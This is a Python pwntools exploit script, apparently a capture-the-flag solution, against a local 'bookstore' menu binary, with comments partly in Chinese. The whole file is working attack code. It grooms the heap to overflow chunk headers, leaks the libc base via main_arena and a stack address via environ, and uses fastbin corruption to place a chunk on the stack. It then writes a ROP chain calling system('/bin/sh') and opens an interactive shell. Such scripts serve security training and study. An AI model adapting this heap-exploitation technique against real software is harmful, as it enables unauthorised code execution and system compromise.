#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-08 19:39:57
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
context.log_level = "debug"
p = process("./bookstore")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

environ_offset = libc.symbols['environ']

book_addr = 0x602060

# local libc
# environ_offset = 0x3c6f38
main_arena_offset = 0x3c4b20
# one_gadget_offset = 0xf02a4
one_gadget_offset = 0xf1147

# 0x0000000000400cd3 : pop rdi ; ret
pop_rdi_ret = 0x0000000000400cd3



def add_book(author, size, bookname):
	p.recvuntil("Your choice:\n")
	p.sendline("1")
	p.recvuntil("What is the author name?\n")
	p.sendline(author)
	p.recvuntil("How long is the book name?\n")
	p.sendline(str(size))
	p.recvuntil("What is the name of the book?\n")
	p.sendline(bookname)

def sellbook(index, ):
	p.recvuntil("Your choice:\n")
	p.sendline("2")
	p.recvuntil("Which book do you want to sell?\n")
	p.sendline(str(index))



def readbook(index):
	p.recvuntil("Your choice:\n")
	p.sendline("3")
	p.recvuntil("Which book do you want to sell?\n")
	p.sendline(str(index))


def getpid():
	print proc.pidof(p)[0]
	pause()


add_book(p64(0) + p64(0x21) , 0, "a" * 8)
add_book("B", 0, "b" * 8)
add_book("C", 0, "c" * 8)
add_book("D", 0x50, "d" * 8)
add_book("e", 0x50, p64(0) + p64(0x51))


# overflow B to C and leak libc
sellbook(1)
add_book("a", 0, p64(0) * 3 + p64(0x91))
sellbook(2)
add_book("b", 0, "a" * 8)
readbook(2)
p.recvuntil("a" * 8)
main_arena_near = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "main_arena_near = " + hex(main_arena_near)
main_arena_addr = main_arena_near - 0xd8
print "main_arena_addr = " + hex(main_arena_addr)
libc_addr = main_arena_addr - main_arena_offset
print "libc_addr = " + hex(libc_addr)
one_gadget_addr = libc_addr + one_gadget_offset
print "one_gadget_addr = " + hex(one_gadget_addr)
environ_addr = libc_addr + environ_offset
print "environ_addr = " + hex(environ_addr)


# 计算system和/bin/sh的地址
print "\ncalculating system() addr and \"/bin/sh\" addr ... ###"
system_addr = libc_addr + libc.symbols['system']
print "system_addr = " + hex(system_addr)
binsh_addr = libc_addr +  next(libc.search("/bin/sh"))
print "binsh_addr = " + hex(binsh_addr)
# getpid()
# 泄露environ中的值
sellbook(2)
sellbook(1)
add_book("a", 0, p64(0) * 3 + p64(0x21) + p64(book_addr))

add_book("a", 0, p64(0))
## 覆盖bookname指针
add_book("a", 0, p64(0) * 2 + p64(environ_addr))
readbook(0)

p.recvuntil("Bookname:")
stack_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "stack_addr = " + hex(stack_addr)

stack_offset_40 = stack_addr - 310


# getpid()
# 
add_book("a", 0x50, "test")

add_book("a", 0, "test1")
add_book("a", 0, "test2")
add_book("a", 0, "test3")


sellbook(7)
add_book("a", 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))
sellbook(8)
sellbook(7)
add_book("a", 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))

add_book("a", 0x30, "1")
print "stack_addr = " + hex(stack_addr)
print "stack_offset_40 = " + hex(stack_offset_40)
# getpid()
# 写返回地址
# payload = "a" * 22 + p64(one_gadget_addr)
payload = "a" * 22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
add_book("a", 0x30, payload)



p.interactive()
